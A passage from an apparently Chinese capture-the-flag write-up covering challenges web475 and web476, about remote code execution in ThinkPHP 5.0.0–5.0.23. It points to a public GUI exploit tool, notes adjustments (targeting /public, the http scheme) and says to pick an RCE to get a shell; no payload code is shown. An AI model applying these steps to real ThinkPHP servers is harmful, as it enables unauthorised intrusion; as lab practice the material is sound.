然后访问`/runtime/cache/0f/ea6a13c52b4d4725368f24b045ca84.php`就可以拿到flag了

# web475

## \#thinkphp5.0.0-5.0.23 rce

这个版本区间的rce漏洞很多，直接上工具测吧

https://github.com/Lotus6/ThinkphpGUI/releases

![](image/Pasted%20image%2020260624110329.png)

直接测/public/index.php不行，得换成/public，另外还需要改成http协议头

![](image/Pasted%20image%2020260624111740.png)

选一个rce漏洞去getshell利用就行了

# web476

## \#thinkphp5.0.0-5.0.23 rce

也是一样，直接工具一把梭了


